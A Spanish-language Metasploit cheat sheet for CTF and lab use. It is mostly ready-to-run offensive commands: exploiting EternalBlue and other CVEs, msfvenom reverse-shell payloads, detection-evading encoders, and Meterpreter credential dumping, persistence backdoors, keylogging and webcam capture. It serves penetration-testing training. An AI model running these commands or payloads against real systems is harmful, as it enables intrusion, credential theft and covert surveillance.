# Metasploit — Guía de Referencia
### Framework de explotación · CTF & lab

> ⚠️ Uso exclusivo en entornos controlados (CTF, laboratorios, sistemas propios o con autorización explícita).

---

## Qué es Metasploit

Metasploit Framework (MSF) es una plataforma de explotación que centraliza exploits, payloads, auxiliares y herramientas de post-explotación en un único entorno. Es el estándar de facto en CTF y pentesting.

**Componentes principales:**

| Componente | Descripción |
|---|---|
| **Exploit** | Código que aprovecha una vulnerabilidad |
| **Payload** | Código que se ejecuta tras explotar — da acceso |
| **Auxiliary** | Módulos de escaneo, fuerza bruta, fuzzing sin payload |
| **Post** | Módulos de post-explotación (tras tener sesión) |
| **Encoder** | Ofusca payloads para evadir detección |
| **Nop** | Genera NOP sleds para exploits |

---

## Instalación y arranque

```bash
# Kali/Parrot — ya incluido
msfconsole

# Iniciar con base de datos (recomendado)
sudo systemctl start postgresql
sudo msfdb init
msfconsole

# Verificar conexión a DB
msf6> db_status
```

---

## 01 · Navegación básica

```bash
# Ayuda general
msf6> help

# Buscar módulos
msf6> search eternalblue
msf6> search type:exploit platform:windows smb
msf6> search cve:2021-44228
msf6> search name:ms17_010

# Usar un módulo
msf6> use exploit/windows/smb/ms17_010_eternalblue
msf6> use 0          # usar por número de resultado en search

# Ver información del módulo
msf6> info

# Ver opciones requeridas
msf6> options
msf6> show options

# Ver payloads compatibles con el exploit actual
msf6> show payloads

# Ver targets disponibles
msf6> show targets

# Volver atrás
msf6> back

# Salir
msf6> exit
```

---

## 02 · Configurar y lanzar un exploit

```bash
# Flujo estándar
msf6> search ms17_010
msf6> use exploit/windows/smb/ms17_010_eternalblue
msf6> options                          # ver qué hace falta configurar

msf6> set RHOSTS 10.10.10.1            # target IP
msf6> set LHOST 10.10.14.5             # tu IP (para el payload)
msf6> set LPORT 4444                   # tu puerto listener
msf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp

msf6> run                              # lanzar
msf6> exploit                          # equivalente a run

# Lanzar en background (no bloquea la consola)
msf6> run -j

# Ver jobs en background
msf6> jobs

# Matar un job
msf6> jobs -k <id>
```

### Opciones comunes

| Opción | Descripción |
|---|---|
| `RHOSTS` | IP(s) objetivo — acepta rangos y CIDR |
| `RPORT` | Puerto del servicio objetivo |
| `LHOST` | Tu IP (para recibir la conexión) |
| `LPORT` | Tu puerto listener |
| `PAYLOAD` | Payload a usar |
| `TARGET` | Versión específica del objetivo |
| `THREADS` | Hilos paralelos (módulos auxiliary) |
| `USERNAME` | Usuario (módulos de auth) |
| `PASSWORD` | Contraseña (módulos de auth) |

```bash
# Configurar múltiples opciones con setg (global — persiste entre módulos)
msf6> setg LHOST 10.10.14.5
msf6> setg LPORT 4444

# Ver variables globales
msf6> get LHOST

# Resetear una opción
msf6> unset LHOST
msf6> unset all
```

---

## 03 · Payloads

### Tipos de payload

| Tipo | Descripción |
|---|---|
| `singles` | Todo en uno — no necesita stager. Ej: `shell_reverse_tcp` |
| `stagers` | Pequeño payload inicial que descarga el stage |
| `stages` | Payload completo descargado por el stager. Ej: `meterpreter` |

### Notación

```
windows/x64/meterpreter/reverse_tcp
└──────┘ └──┘ └────────┘ └─────────┘
   OS    arch  stage      conexión

# / entre stage y conexión → staged (stager + stage)
# _ entre stage y conexión → single (todo en uno)

windows/x64/meterpreter/reverse_tcp   → staged
windows/x64/meterpreter_reverse_tcp   → single
```

### Payloads más usados en CTF

```bash
# Linux
linux/x64/shell_reverse_tcp              # shell simple, single
linux/x64/meterpreter/reverse_tcp        # meterpreter, staged
linux/x86/meterpreter/reverse_tcp        # para sistemas 32bit

# Windows
windows/x64/shell_reverse_tcp            # shell CMD simple
windows/x64/meterpreter/reverse_tcp      # meterpreter completo
windows/x64/meterpreter/reverse_https    # meterpreter por HTTPS (más sigiloso)
windows/x64/powershell_reverse_tcp       # shell PowerShell

# Multi-plataforma
java/meterpreter/reverse_tcp             # Java (Tomcat, Jenkins…)
python/meterpreter/reverse_tcp           # Python
php/meterpreter/reverse_tcp              # PHP webshell
cmd/unix/reverse_bash                    # bash puro
```

```bash
# Seleccionar payload
msf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Ver opciones específicas del payload
msf6> show options
```

---

## 04 · Multi/Handler — recibir conexiones

Cuando generas un payload con msfvenom y lo ejecutas en el objetivo, necesitas un listener en Metasploit para recibirlo.

```bash
msf6> use exploit/multi/handler
msf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6> set LHOST <tu_ip>
msf6> set LPORT 4444
msf6> run -j              # en background para no bloquear la consola

# Para múltiples conexiones entrantes
msf6> set ExitOnSession false
msf6> run -j
```

---

## 05 · Meterpreter

Meterpreter es un payload avanzado que corre en memoria del objetivo sin escribir en disco. Ofrece comandos propios más potentes que una shell estándar.

### Comandos esenciales

```bash
# Sistema
meterpreter> sysinfo              # info del sistema
meterpreter> getuid               # usuario actual
meterpreter> getpid               # PID del proceso
meterpreter> ps                   # lista de procesos
meterpreter> pwd                  # directorio actual
meterpreter> ls                   # listar directorio

# Navegación
meterpreter> cd C:\\Users
meterpreter> cat fichero.txt

# Shell del sistema
meterpreter> shell                # abre cmd.exe o /bin/bash
# Ctrl+Z para volver a meterpreter

# Ficheros
meterpreter> download fichero.txt /tmp/     # descargar del objetivo
meterpreter> upload /tmp/tool.exe C:\\Temp  # subir al objetivo
meterpreter> search -f "*.txt" -d C:\\      # buscar ficheros

# Red
meterpreter> ipconfig             # interfaces de red
meterpreter> netstat              # conexiones activas
meterpreter> arp                  # tabla ARP
```

### Escalada de privilegios

```bash
# Ver privilegios actuales
meterpreter> getuid
meterpreter> getprivs

# Intentar escalada automática
meterpreter> getsystem

# Si getsystem falla — buscar módulos de privesc
meterpreter> background
msf6> use post/multi/recon/local_exploit_suggester
msf6> set SESSION <id>
msf6> run
```

### Migración de proceso

```bash
# Migrar a un proceso más estable o con más privilegios
meterpreter> ps                              # ver procesos
meterpreter> migrate <PID>                   # migrar al PID

# Migrar a un proceso de SYSTEM
meterpreter> migrate -N lsass.exe           # por nombre
meterpreter> migrate -N explorer.exe
```

**¿Por qué migrar?** — El proceso inicial puede cerrarse. Migrar a un proceso estable (explorer.exe, svchost.exe) mantiene la sesión activa aunque el proceso original termine.

### Dumping de credenciales

```bash
# Hashes del sistema (requiere SYSTEM)
meterpreter> hashdump

# Mimikatz integrado
meterpreter> load kiwi
meterpreter> creds_all              # todas las credenciales
meterpreter> lsa_dump_sam           # hashes SAM
meterpreter> lsa_dump_secrets       # secretos LSA
meterpreter> golden_ticket_create   # golden ticket Kerberos
```

### Pivoting y port forwarding

```bash
# Port forwarding — acceder a servicios internos
meterpreter> portfwd add -l 3306 -p 3306 -r <ip_interna>
# Ahora puedes conectar a localhost:3306 para llegar al MySQL interno

# Listar y eliminar
meterpreter> portfwd list
meterpreter> portfwd delete -l 3306

# Routing — acceder a subredes internas
meterpreter> background
msf6> route add 192.168.2.0/24 <session_id>
msf6> route print
```

### Persistencia

```bash
# Instalar backdoor persistente (Windows)
meterpreter> run post/windows/manage/persistence_exe \
    STARTUP=SCHEDULER \
    SESSION=<id>

# Via registro
meterpreter> run post/windows/manage/persistence \
    STARTUP=REGISTRY
```

### Captura de pantalla y keylogging

```bash
meterpreter> screenshot             # captura de pantalla
meterpreter> keyscan_start          # iniciar keylogger
meterpreter> keyscan_dump           # ver teclas capturadas
meterpreter> keyscan_stop           # parar keylogger

# Webcam (si existe)
meterpreter> webcam_list
meterpreter> webcam_snap
```

---

## 06 · Sesiones

```bash
# Ver sesiones activas
msf6> sessions
msf6> sessions -l

# Interactuar con una sesión
msf6> sessions -i <id>

# Backgroundear sesión actual
meterpreter> background
# o Ctrl+Z

# Matar sesión
msf6> sessions -k <id>
msf6> sessions -K          # matar todas

# Upgradear shell a meterpreter
msf6> sessions -u <id>     # intentar upgrade automático
```

---

## 07 · Módulos Auxiliary

Los módulos auxiliary no necesitan payload — sirven para escaneo, enumeración y fuerza bruta.

```bash
# Escaneo de puertos
msf6> use auxiliary/scanner/portscan/tcp
msf6> set RHOSTS 10.10.10.0/24
msf6> set PORTS 22,80,443,445,3389
msf6> run

# Escaneo SMB
msf6> use auxiliary/scanner/smb/smb_ms17_010
msf6> set RHOSTS 10.10.10.1
msf6> run

# Enumeración SMB
msf6> use auxiliary/scanner/smb/smb_enumshares
msf6> use auxiliary/scanner/smb/smb_enumusers
msf6> use auxiliary/scanner/smb/smb_version

# Fuerza bruta SSH
msf6> use auxiliary/scanner/ssh/ssh_login
msf6> set RHOSTS 10.10.10.1
msf6> set USERNAME admin
msf6> set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6> run

# Fuerza bruta HTTP
msf6> use auxiliary/scanner/http/http_login
msf6> set RHOSTS 10.10.10.1
msf6> set AUTH_URI /admin/login
msf6> set USERNAME admin
msf6> set PASS_FILE rockyou.txt
msf6> run

# Banner grabbing
msf6> use auxiliary/scanner/portscan/tcp
msf6> use auxiliary/scanner/ftp/ftp_version
msf6> use auxiliary/scanner/ssh/ssh_version
msf6> use auxiliary/scanner/http/http_version
```

---

## 08 · Módulos Post

Se ejecutan sobre una sesión activa para enumerar, escalar y pivotar.

```bash
# Sugeridor de exploits locales
msf6> use post/multi/recon/local_exploit_suggester
msf6> set SESSION <id>
msf6> run

# Enumeración general
msf6> use post/linux/gather/enum_system
msf6> use post/windows/gather/enum_system
msf6> use post/multi/gather/env

# Credenciales
msf6> use post/windows/gather/credentials/credential_collector
msf6> use post/windows/gather/hashdump
msf6> use post/linux/gather/hashdump

# Ficheros interesantes
msf6> use post/windows/gather/forensics/browser_history
msf6> use post/linux/gather/enum_configs

# Escalada Windows
msf6> use post/windows/escalate/getsystem
msf6> use post/windows/manage/enable_rdp    # habilitar RDP

# Escalada Linux
msf6> use post/linux/escalate/docker_escape
```

---

## 09 · msfvenom — generar payloads

msfvenom genera payloads standalone para ejecutar en el objetivo sin necesidad de Metasploit en ese momento.

### Sintaxis base

```bash
msfvenom -p <payload> LHOST=<ip> LPORT=<puerto> -f <formato> -o <fichero>
```

### Payloads Windows

```bash
# Ejecutable .exe
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=<tu_ip> LPORT=4444 \
    -f exe -o shell.exe

# DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=<tu_ip> LPORT=4444 \
    -f dll -o shell.dll

# PowerShell
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=<tu_ip> LPORT=4444 \
    -f psh -o shell.ps1

# MSI (para AlwaysInstallElevated)
msfvenom -p windows/x64/shell_reverse_tcp \
    LHOST=<tu_ip> LPORT=4444 \
    -f msi -o shell.msi

# HTA (HTML Application)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=<tu_ip> LPORT=4444 \
    -f hta-psh -o shell.hta
```

### Payloads Linux

```bash
# ELF ejecutable
msfvenom -p linux/x64/meterpreter/reverse_tcp \
    LHOST=<tu_ip> LPORT=4444 \
    -f elf -o shell

chmod +x shell

# Shell simple (sin meterpreter)
msfvenom -p linux/x64/shell_reverse_tcp \
    LHOST=<tu_ip> LPORT=4444 \
    -f elf -o shell
```

### Payloads Web

```bash
# PHP
msfvenom -p php/meterpreter/reverse_tcp \
    LHOST=<tu_ip> LPORT=4444 \
    -f raw -o shell.php

# JSP (Tomcat/Java)
msfvenom -p java/jsp_shell_reverse_tcp \
    LHOST=<tu_ip> LPORT=4444 \
    -f raw -o shell.jsp

# WAR (Tomcat)
msfvenom -p java/meterpreter/reverse_tcp \
    LHOST=<tu_ip> LPORT=4444 \
    -f war -o shell.war

# ASPX (.NET)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=<tu_ip> LPORT=4444 \
    -f aspx -o shell.aspx
```

### Encoders — ofuscar payload

```bash
# Listar encoders
msfvenom --list encoders

# Con encoder shikata_ga_nai (x86)
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=<tu_ip> LPORT=4444 \
    -e x86/shikata_ga_nai -i 5 \    # -i = iteraciones
    -f exe -o shell_encoded.exe

# Con múltiples encoders
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=<tu_ip> LPORT=4444 \
    -e x64/xor_dynamic -i 3 \
    -f exe -o shell.exe
```

### Listar formatos disponibles

```bash
msfvenom --list formats      # formatos de output
msfvenom --list payloads     # todos los payloads
msfvenom --list platforms    # plataformas soportadas
```

---

## 10 · Base de datos — workspace

```bash
# Ver workspaces
msf6> workspace

# Crear workspace para un CTF
msf6> workspace -a htb_machine

# Cambiar de workspace
msf6> workspace htb_machine

# Eliminar workspace
msf6> workspace -d htb_machine

# Importar escaneo de nmap
msf6> db_nmap -sV -sC -p- 10.10.10.1
msf6> db_import /ruta/nmap_scan.xml

# Ver hosts descubiertos
msf6> hosts
msf6> hosts -c address,os_name,purpose

# Ver servicios descubiertos
msf6> services
msf6> services -p 445         # filtrar por puerto

# Ver credenciales capturadas
msf6> creds

# Ver vulnerabilidades
msf6> vulns
```

---

## Exploits frecuentes en CTF

| CVE / Nombre | Módulo | Objetivo |
|---|---|---|
| MS17-010 EternalBlue | `exploit/windows/smb/ms17_010_eternalblue` | Windows 7/2008 SMB |
| MS08-067 Netapi | `exploit/windows/smb/ms08_067_netapi` | Windows XP/2003 |
| Log4Shell CVE-2021-44228 | `exploit/multi/http/log4shell_header_injection` | Java Log4j2 |
| Shellshock CVE-2014-6271 | `exploit/multi/http/apache_mod_cgi_bash_env_exec` | Apache CGI |
| PrintNightmare CVE-2021-34527 | `exploit/windows/dcerpc/cve_2021_1675_printspooler` | Windows Print Spooler |
| Eternal Romance MS17-010 | `exploit/windows/smb/ms17_010_psexec` | Windows SMB |
| Tomcat Upload | `exploit/multi/http/tomcat_mgr_upload` | Apache Tomcat |
| Rejetto HFS | `exploit/windows/http/rejetto_hfs_exec` | HFS 2.3 |
| Drupalgeddon2 | `exploit/unix/webapp/drupal_drupalgeddon2` | Drupal 7/8 |
| Struts CVE-2017-5638 | `exploit/multi/http/struts2_content_type_ognl` | Apache Struts2 |

---

## Referencia rápida de comandos

```bash
# Búsqueda y selección
search <término>
use <módulo>
info
options

# Configuración
set <OPCIÓN> <valor>
setg <OPCIÓN> <valor>      # global
unset <OPCIÓN>
show options
show payloads
show targets

# Ejecución
run / exploit
run -j                     # en background
check                      # verificar si el target es vulnerable sin explotar

# Sesiones
sessions -l                # listar
sessions -i <id>           # interactuar
sessions -k <id>           # matar
sessions -u <id>           # upgrade a meterpreter
background / Ctrl+Z        # backgroundear sesión

# Meterpreter esencial
sysinfo / getuid / getpid
ps / migrate <PID>
shell
download / upload
hashdump
load kiwi → creds_all
getsystem
portfwd add -l <lport> -p <rport> -r <ip>
background

# DB
workspace -a <nombre>
db_nmap <opciones> <target>
hosts / services / creds / vulns
```

---

## Flujo completo en CTF

```bash
# 1 — iniciar con DB
sudo systemctl start postgresql
msfconsole
msf6> workspace -a maquina_htb

# 2 — escaneo integrado
msf6> db_nmap -sV -sC -p- 10.10.10.1
msf6> services                          # ver qué encontró

# 3 — buscar exploit para el servicio identificado
msf6> search ms17_010
msf6> use exploit/windows/smb/ms17_010_eternalblue
msf6> options

# 4 — configurar y lanzar
msf6> set RHOSTS 10.10.10.1
msf6> set LHOST 10.10.14.5
msf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6> run

# 5 — post-explotación con meterpreter
meterpreter> sysinfo
meterpreter> getuid
meterpreter> getsystem
meterpreter> hashdump
meterpreter> search -f "*.txt" -d C:\\Users

# 6 — si necesitas privesc
meterpreter> background
msf6> use post/multi/recon/local_exploit_suggester
msf6> set SESSION 1
msf6> run
```

---

*Metasploit Reference — uso exclusivo en entornos autorizados · CTF / laboratorio*
*metasploit.com · github.com/rapid7/metasploit-framework*
